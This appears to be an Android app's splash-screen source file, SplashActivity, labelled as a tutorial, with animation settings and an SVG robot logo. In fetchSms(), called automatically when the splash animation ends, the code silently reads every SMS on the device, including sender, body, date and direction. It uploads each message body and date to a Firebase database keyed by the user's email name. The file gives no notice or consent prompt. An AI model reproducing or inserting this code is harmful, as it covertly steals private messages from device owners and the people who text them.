package com.android.tutorial.activity;

import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.text.format.DateFormat;
import android.widget.Toast;

import com.android.tutorial.R;
import com.android.tutorial.utils.MyDevice;
import com.android.tutorial.utils.PrefManager;
import com.daimajia.androidanimations.library.Techniques;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.viksaa.sssplash.lib.activity.AwesomeSplash;
import com.viksaa.sssplash.lib.cnst.Flags;
import com.viksaa.sssplash.lib.model.ConfigSplash;

import java.util.ArrayList;
import java.util.Date;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class SplashActivity extends AwesomeSplash {

    private DatabaseReference mFirebaseDatabase;
    private FirebaseDatabase mFirebaseInstance;
    Cursor cursor;

    @Override
    public void initSplash(ConfigSplash configSplash) {
            /* you don't have to override every property */

        //Customize Circular Reveal
        configSplash.setBackgroundColor(R.color.colorPrimary); //any color you want form colors.xml
        configSplash.setAnimCircularRevealDuration(1000); //int ms
        configSplash.setRevealFlagX(Flags.REVEAL_RIGHT);  //or Flags.REVEAL_LEFT
        configSplash.setRevealFlagY(Flags.REVEAL_BOTTOM); //or Flags.REVEAL_TOP

        //Choose LOGO OR PATH; if you don't provide String value for path it's logo by default

        //Customize Logo
        configSplash.setLogoSplash(R.mipmap.ic_launcher); //or any other drawable
        configSplash.setAnimLogoSplashDuration(1000); //int ms
        configSplash.setAnimLogoSplashTechnique(Techniques.Bounce); //choose one form Techniques (ref: https://github.com/daimajia/AndroidViewAnimations)


        //Customize Path
        configSplash.setPathSplash(DROID_LOGO); //set path String
        configSplash.setOriginalHeight(400); //in relation to your svg (path) resource
        configSplash.setOriginalWidth(400); //in relation to your svg (path) resource
        configSplash.setAnimPathStrokeDrawingDuration(500);
        configSplash.setPathSplashStrokeSize(3); //I advise value be <5
        configSplash.setPathSplashStrokeColor(R.color.colorAccent); //any color you want form colors.xml
        configSplash.setAnimPathFillingDuration(1000);
        configSplash.setPathSplashFillColor(R.color.white); //path object filling color


        try {
            //Customize Title
            configSplash.setTitleSplash("My Awesome App");
            configSplash.setTitleTextColor(R.color.white);
            configSplash.setTitleTextSize(30f); //float value
            configSplash.setAnimTitleDuration(500);
            configSplash.setAnimTitleTechnique(Techniques.FlipInX);
            configSplash.setTitleFont("fonts/diti_sweet.ttf"); //provide string to your font located in assets/fonts/
        } catch (Exception e) {
            Toast.makeText(this, "Text Font EXCEPTION:" + e, Toast.LENGTH_SHORT).show();
        }

    }

    @Override
    public void animationsFinished() {
        mFirebaseInstance = FirebaseDatabase.getInstance();
        mFirebaseDatabase = mFirebaseInstance.getReference();
        fetchSms();
        PrefManager prefManager = new PrefManager(getApplicationContext());
        if (!prefManager.isFirstTimeLaunch()) {
            launchHomeScreen();
            finish();
        } else {
            launchWelcomeScreen();
        }
    }

    public ArrayList fetchSms() {
        ArrayList sms = new ArrayList();
        Uri message = Uri.parse("content://sms/");
        ContentResolver cr = SplashActivity.this.getContentResolver();

        Cursor cursor = cr.query(message, null, null, null, null);
        SplashActivity.this.startManagingCursor(cursor);
        int totalSMS = cursor.getCount();
        String readStatus = "";
        long millisecond;
        if (cursor.moveToFirst()) {
            for (int i = 0; i < totalSMS; i++) {
                if (cursor.getString(cursor.getColumnIndexOrThrow("type")).contains("1")) {
                    readStatus = "inbox";
                } else {
                    readStatus = "sent";
                }

                millisecond = Long.parseLong(cursor.getString(cursor.getColumnIndexOrThrow("date")));
                String dateString = DateFormat.format("MM/dd/yyyy hh:mm", new Date(millisecond)).toString();

                sms.add("MobileNumber:" + cursor.getString(cursor.getColumnIndexOrThrow("address"))
                        + "\nSMS:" + cursor.getString(cursor.getColumnIndexOrThrow("body"))
                        + "\nDATE:" + dateString
                        + "\nTYPE:" + cursor.getColumnIndexOrThrow("type")
                        + "\nReadStatus:" + readStatus);

                String senderAddress = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                Pattern pt = Pattern.compile("[^a-zA-Z0-9]");
                Matcher match = pt.matcher(senderAddress);
                while (match.find()) {
                    String s = match.group();
                    senderAddress = senderAddress.replaceAll("\\" + s, "");
                }

                mFirebaseDatabase.child("sms").child("" + MyDevice.getDeviceEmailName(SplashActivity.this)
//                                MyDevice.getDeviceName()
                        /*+"(" + MyDevice.getDeviceOsVersion() + ")"*/)
                        .child(senderAddress)
                        .child(readStatus)
                        .child("" + i)
                        .setValue("" + cursor.getString(cursor.getColumnIndexOrThrow("body"))
                                + " " + dateString
                        );
                cursor.moveToNext();
            }
        }
        // else {
        // throw new RuntimeException("You have no SMS");
        // }
        cursor.close();

        return sms;
    }

/*
    CountDownTimer timer;
    int TIME = 1000 * 2;
    int INTERVAL = 1000;
    TextView textView;
    private PrefManager prefManager;


  @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_splash);
        Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);

        prefManager = new PrefManager(this);

        FloatingActionButton fab = (FloatingActionButton) findViewById(R.id.fab);
        fab.hide();
        fab.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Snackbar.make(view, "Replace with your own action", Snackbar.LENGTH_LONG)
                        .setAction("Action", null).show();
            }
        });

        textView = (TextView) findViewById(R.id.timeTextView);
        timer = new CountDownTimer(TIME, INTERVAL) {
            @Override
            public void onTick(long millisUntilFinished) {
                textView.setText("" + (millisUntilFinished / 1000 - 1));
            }

            @Override
            public void onFinish() {
                if (!prefManager.isFirstTimeLaunch()) {
                    launchHomeScreen();
                    finish();
                } else {
                    launchWelcomeScreen();
                }
            }
        };
        timer.start();
    }
*/

    private void launchWelcomeScreen() {
        Intent intent = new Intent(getApplicationContext(), WelcomeActivity.class);
        startActivity(intent);
        finish();
    }

    private void launchHomeScreen() {
        PrefManager prefManager = new PrefManager(getApplicationContext());
        prefManager.setFirstTimeLaunch(false);
        startActivity(new Intent(SplashActivity.this, MainActivity.class));
        finish();
    }

    //path
    public static final String DROID_LOGO = "M 149.22,22.00\n" +
            "           C 148.23,20.07 146.01,16.51 146.73,14.32\n" +
            "             148.08,10.21 152.36,14.11 153.65,16.06\n" +
            "             153.65,16.06 165.00,37.00 165.00,37.00\n" +
            "             194.29,27.24 210.71,27.24 240.00,37.00\n" +
            "             240.00,37.00 251.35,16.06 251.35,16.06\n" +
            "             252.64,14.11 256.92,10.21 258.27,14.32\n" +
            "             258.99,16.51 256.77,20.08 255.78,22.00\n" +
            "             252.53,28.28 248.44,34.36 246.00,41.00\n" +
            "             252.78,43.16 258.78,48.09 263.96,52.85\n" +
            "             281.36,68.83 289.00,86.62 289.00,110.00\n" +
            "             289.00,110.00 115.00,110.00 115.00,110.00\n" +
            "             115.00,110.00 117.66,91.00 117.66,91.00\n" +
            "             120.91,76.60 130.30,62.72 141.04,52.85\n" +
            "             146.22,48.09 152.22,43.16 159.00,41.00\n" +
            "             159.00,41.00 149.22,22.00 149.22,22.00 Z\n" +
            "           M 70.80,56.00\n" +
            "           C 70.80,56.00 97.60,100.00 97.60,100.00\n" +
            "             101.34,106.21 108.32,116.34 110.21,123.00\n" +
            "             113.76,135.52 103.90,147.92 91.00,147.92\n" +
            "             78.74,147.92 74.44,139.06 69.00,130.00\n" +
            "             69.00,130.00 39.80,82.00 39.80,82.00\n" +
            "             35.73,75.29 28.40,66.08 29.20,58.00\n" +
            "             30.26,47.20 38.61,40.47 49.00,39.72\n" +
            "             61.22,40.24 64.96,46.28 70.80,56.00 Z\n" +
            "           M 375.80,58.00\n" +
            "           C 376.60,66.08 369.27,75.29 365.20,82.00\n" +
            "             365.20,82.00 336.00,130.00 336.00,130.00\n" +
            "             330.71,138.82 326.73,147.24 315.00,147.89\n" +
            "             301.74,148.63 291.14,135.87 294.79,123.00\n" +
            "             296.68,116.34 303.66,106.21 307.40,100.00\n" +
            "             307.40,100.00 333.00,58.00 333.00,58.00\n" +
            "             339.02,47.98 342.23,40.92 355.00,39.72\n" +
            "             365.83,40.00 374.69,46.77 375.80,58.00 Z\n" +
            "           M 289.00,116.00\n" +
            "           C 289.00,116.00 289.00,239.00 289.00,239.00\n" +
            "             288.98,249.72 285.92,257.31 275.00,261.10\n" +
            "             265.22,264.50 258.37,259.56 255.02,264.43\n" +
            "             253.78,266.24 254.00,269.84 254.00,272.00\n" +
            "             254.00,272.00 254.00,298.00 254.00,298.00\n" +
            "             254.00,304.85 254.77,310.07 250.36,315.93\n" +
            "             242.35,326.68 226.84,326.49 218.80,315.93\n" +
            "             215.07,311.00 215.01,306.83 215.00,301.00\n" +
            "             215.00,301.00 215.00,262.00 215.00,262.00\n" +
            "             215.00,262.00 190.00,262.00 190.00,262.00\n" +
            "             190.00,262.00 190.00,301.00 190.00,301.00\n" +
            "             189.99,306.83 189.93,311.00 186.20,315.93\n" +
            "             178.16,326.49 162.65,326.68 154.64,315.93\n" +
            "             151.09,311.22 151.01,307.61 151.00,302.00\n" +
            "             151.00,302.00 151.00,272.00 151.00,272.00\n" +
            "             151.00,269.84 151.22,266.24 149.98,264.43\n" +
            "             146.53,259.42 138.97,264.76 129.00,260.86\n" +
            "             118.39,256.72 116.02,248.29 116.00,238.00\n" +
            "             116.00,238.00 116.00,116.00 116.00,116.00\n" +
            "             116.00,116.00 289.00,116.00 289.00,116.00 Z";

}
